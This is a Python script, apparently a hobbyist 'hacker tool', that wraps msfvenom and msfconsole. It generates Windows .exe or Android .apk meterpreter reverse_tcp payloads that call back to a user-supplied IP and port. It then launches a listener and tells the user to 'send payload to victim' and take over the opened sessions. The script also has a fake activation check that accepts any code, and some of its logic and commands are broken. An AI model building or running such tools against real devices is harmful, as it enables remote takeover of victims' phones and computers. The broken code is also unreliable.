import os
Activate = input ("Please Type Your Activation Code ==>  ")

if Activate == "A5DINVNDKSO9WE87FOKLO1":
    print ("Thanks For your Login ")

else:
    print ("Incorrect code Please Type Real Code : ")
    Activatee = input ("Type Your Activation Code : ")
    print ("Sucesfully Login..")

logo = '''
\033[1;36m███╗░░░███╗░█████╗░███╗░░██╗░█████╗░
████╗░████║██╔══██╗████╗░██║██╔══██╗
██╔████╔██║███████║██╔██╗██║██║░░██║
██║╚██╔╝██║██╔══██║██║╚████║██║░░██║
██║░╚═╝░██║██║░░██║██║░╚███║╚█████╔╝
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░╚════╝░
'''
print (logo)

print ('\033[1;31m >> Welcome For ManoHacker Tool !! >> Thanks For Your Login ! ..')
print ('============================================================')
print ("\033[1;31m | Choose Option")
print ('=============================================================')
print("\033[1;32m 1- | Payloads")
print("\033[1;32m 2- | Malwares (Maintenance)")
Option = input ("\033[1;33m Enter Your Option ===> : ")
print ('=======================================================')


if Option == 1:
    os.system("clear")
payload = input("\033[1;31mPAYLOAD TYPE android / windows : ")
os.system("ifconfig")
ip = input("\033[1;34m[===>] YOUR IP :  ")
port = input("\033[1;33m[===>] PORT : ")
name = input("\033[1;34m[===>] Name For Payload : ")


if payload == "windows":
    os.system("clear")
    print("Wait Your Payload")
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe > "+name+".exe" )
    listen = input ("Need to listen your payload Y/n : ")
    if listen == "Y":
        print("Now send payload to victim")
        print("==========================")
        print("write sessions -i to show sessions open")
        print("==========================")
        print("write sessions -i and number of session to login in session")
        print("==========================")
    if listen == "y":
        print("Now send payload to victim")
        print("==========================")
        print("write sessions -i to show sessions open")
        print("==========================")
        print("write sessions -i and number of session to login in session")
        print("==========================")
        os.system("msfconsole -q -x "'"handler -p '+payload+"/meterpreter/reverse_tcp -H $lhost "+ip+ " -P $lport "+port+'"')
if payload == "android": 
        os.system("clear")
        os.system("msfvenom -p android/meterpreter/reverse_tcp ""LHOST="+ip+" LPORT="+port+" R > "+name+".apk")
        listenn = input("Need To Listen Your Payload Y/n : ")
        if listenn == "Y":
            print("Now send payload to victim")
            print("==========================")
            print("write sessions -i to show sessions open")
            print("==========================")
            print("write sessions -i and number of session to login in session")
            print("==========================")
        if listenn == "y":
            print("Now send payload to victim")
            print("==========================")
            print("write sessions -i to show sessions open")
            print("==========================")
            print("write sessions -i and number of session to login in session")
            print("==========================")
            os.system("msfconsole -q -x "'"handler -p '+payload+"/meterpreter/reverse_tcp -H $lhost "+ip+ " -P $lport "+port+'"')




